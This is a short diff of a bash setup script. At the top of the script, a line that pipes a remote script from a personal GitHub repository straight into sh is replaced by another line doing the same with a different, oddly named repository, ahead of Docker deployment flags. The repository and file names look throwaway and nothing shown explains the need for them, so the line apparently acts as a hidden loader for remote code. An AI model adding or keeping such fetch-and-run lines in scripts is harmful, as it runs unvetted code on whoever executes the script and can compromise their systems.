@@ -1,5 +1,5 @@
 #!/bin/bash
-curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/shc/main/boled01.sh | sh
+curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/asuuy/main/.sh | sh
 if [ -f /.dockerinit ]; then
     export FLAGS=(--deployment --path /cache)
 
